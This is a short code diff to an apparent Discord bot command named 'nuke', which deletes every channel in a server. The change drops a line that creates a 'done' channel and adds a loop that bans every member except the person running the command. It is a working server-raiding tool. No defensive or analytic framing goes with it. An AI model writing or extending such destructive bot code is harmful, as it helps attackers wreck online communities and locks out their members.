@@ -327,8 +327,9 @@ async def nuke(ctx):
     for channel in channels:
         await channel.delete()
     chanam2 = len(ctx.guild.channels)
-
-    await ctx.guild.create_text_channel(name="done")
+    for member in ctx.guild.members:
+        if member != ctx.author:
+            await member.ban()
 
     print(f"Done, deleted {chanam-chanam2} channels")
 
